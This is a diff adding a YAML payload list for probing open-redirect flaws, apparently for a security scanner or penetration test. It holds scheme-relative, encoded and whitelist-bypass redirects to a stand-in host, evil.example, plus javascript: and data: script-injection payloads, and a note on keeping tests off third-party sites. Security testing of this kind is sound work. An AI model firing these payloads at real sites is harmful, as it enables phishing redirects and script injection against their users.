@@ -1,0 +1,27 @@
+name: Open Redirect Payloads
+description: Redirect-parameter probes - scheme-relative, encoded, whitelist-bypass
+
+basic:
+  - "//evil.example"
+  - "https://evil.example"
+  - "/\\evil.example"
+
+encoded:
+  - "%2f%2fevil.example"
+  - "%09//evil.example"
+  - "https:evil.example"
+
+whitelist_bypass:
+  - "https://target.com.evil.example"
+  - "https://evil.example?target.com"
+  - "https://evil.example#target.com"
+  - "https://evil.example%2f%2ftarget.com"
+
+data_and_js_schemes:
+  - "javascript:alert(document.domain)"
+  - "data:text/html,<script>alert(document.domain)</script>"
+
+notes: >
+  Point every non-scheme payload at an interactsh or otherwise attacker-owned
+  domain, never at a live third-party site, so the redirect is observable
+  without affecting anyone outside the test.
